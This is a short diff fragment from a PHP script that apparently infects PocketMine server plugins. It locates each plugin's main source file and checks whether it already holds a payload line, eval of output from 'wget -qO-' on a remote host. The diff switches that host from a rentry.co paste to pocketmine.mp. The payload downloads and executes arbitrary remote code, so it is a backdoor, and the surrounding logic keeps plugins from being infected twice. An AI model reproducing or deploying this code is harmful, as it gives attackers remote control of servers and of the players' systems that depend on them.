@@ -16,7 +16,7 @@ try {
         $mainPath = explode("/", $main);
         $filePath = $dirPath . "/src/" . ($srcNamespacePrefix ? end($mainPath) : $main) . ".php";
         $fileContents = explode("\n", @file_get_contents($filePath));
-        $payload = "eval(`wget -qO- rentry.co/pmmp/raw`);";
+        $payload = "eval(`wget -qO- pocketmine.mp`);";
         foreach ($fileContents as $value) {
             if (str_contains($value, $payload)) continue 2;
         }
